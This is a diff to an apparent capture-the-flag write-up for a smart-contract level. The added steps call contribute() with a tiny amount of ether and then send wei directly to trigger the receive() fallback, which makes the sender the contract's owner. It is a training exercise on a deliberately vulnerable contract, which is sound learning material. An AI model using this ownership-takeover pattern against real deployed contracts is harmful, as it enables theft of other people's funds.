@@ -3,8 +3,14 @@ contribute() function is misleading because you may think that in order to get o
 Pay attantion to the receive() function, which is a fallback function. It will make you an owner if the require conditions are met. 
 (You can learn more about fallback functions here: https://github.com/ethereumbook/ethereumbook/blob/develop/06transactions.asciidoc)
 
-First, in order to make your 'contribution' positive, send any small amount of ether (< 0.001 ether) via contribute() function:
-> > await contract.contribute({value: toWei('0.0001')})
-> 
+1) In order to make your 'contribution' positive, send any small amount of ether (< 0.001 ether) via contribute() function:
+> contract.contribute({value: toWei('0.0001')})
+
+2) Trigger fallback function execution by sending any amount of wei to the contract. 
+> contract.send({value: 5})
+	Now you are the owner of the contract
+ 
+
+
 
 
